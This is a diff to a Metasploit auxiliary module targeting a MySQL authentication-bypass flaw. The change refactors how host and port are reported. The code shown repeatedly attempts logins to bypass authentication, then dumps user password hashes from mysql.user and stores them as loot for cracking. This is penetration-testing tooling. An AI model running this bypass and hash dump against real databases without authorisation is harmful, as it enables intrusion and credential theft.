@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
       results << mysql_client
       close_required = false
 
-      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
+      print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{mysql_client.peerhost}:#{mysql_client.peerport}"
 
     rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
       print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     # Short circuit if we already won
     if results.length > 0
       self.mysql_conn = results.first
-      return dump_hashes
+      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
     end
 
 
@@ -122,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
             s = connect(false)
             mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)
 
-            print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
+            print_good "#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
             close_required = false
           rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
@@ -158,20 +158,20 @@ class MetasploitModule < Msf::Auxiliary
 
 
     if results.length > 0
-      print_good("#{rhost}:#{rport} Successfully exploited the authentication bypass flaw, dumping hashes...")
+      print_good("#{mysql_client.peerhost}:#{mysql_client.peerport} Successfully exploited the authentication bypass flaw, dumping hashes...")
       self.mysql_conn = results.first
-      return dump_hashes
+      return dump_hashes(mysql_client.peerhost, mysql_client.peerport)
     end
 
     print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
   end
 
-  def dump_hashes
+  def dump_hashes(host, port)
 
     # Grabs the username and password hashes and stores them as loot
     res = mysql_query("SELECT user,password from mysql.user")
     if res.nil?
-      print_error("#{rhost}:#{rport} There was an error reading the MySQL User Table")
+      print_error("#{host}:#{port} There was an error reading the MySQL User Table")
       return
 
     end
@@ -187,29 +187,29 @@ class MetasploitModule < Msf::Auxiliary
       res.each do |row|
         next unless (row[0].to_s + row[1].to_s).length > 0
         tbl << [row[0], row[1]]
-        print_good("#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}")
+        print_good("#{host}:#{port} Saving HashString as Loot: #{row[0]}:#{row[1]}")
       end
     end
 
     this_service = nil
     if framework.db and framework.db.active
       this_service = report_service(
-        :host  => rhost,
-        :port => rport,
+        :host  => host,
+        :port => port,
         :name => 'mysql',
         :proto => 'tcp'
       )
     end
 
-    report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?
+    report_hashes(tbl.to_csv, this_service, host, port) unless tbl.rows.empty?
 
   end
 
   # Stores the Hash Table as Loot for Later Cracking
-  def report_hashes(hash_loot,service)
-    filename= "#{rhost}-#{rport}_mysqlhashes.txt"
-    path = store_loot("mysql.hashes", "text/plain", rhost, hash_loot, filename, "MySQL Hashes", service)
-    print_good("#{rhost}:#{rport} Hash Table has been saved: #{path}")
+  def report_hashes(hash_loot,service, host, port)
+    filename= "#{host}-#{port}_mysqlhashes.txt"
+    path = store_loot("mysql.hashes", "text/plain", host, hash_loot, filename, "MySQL Hashes", service)
+    print_good("#{host}:#{port} Hash Table has been saved: #{path}")
 
   end
 end
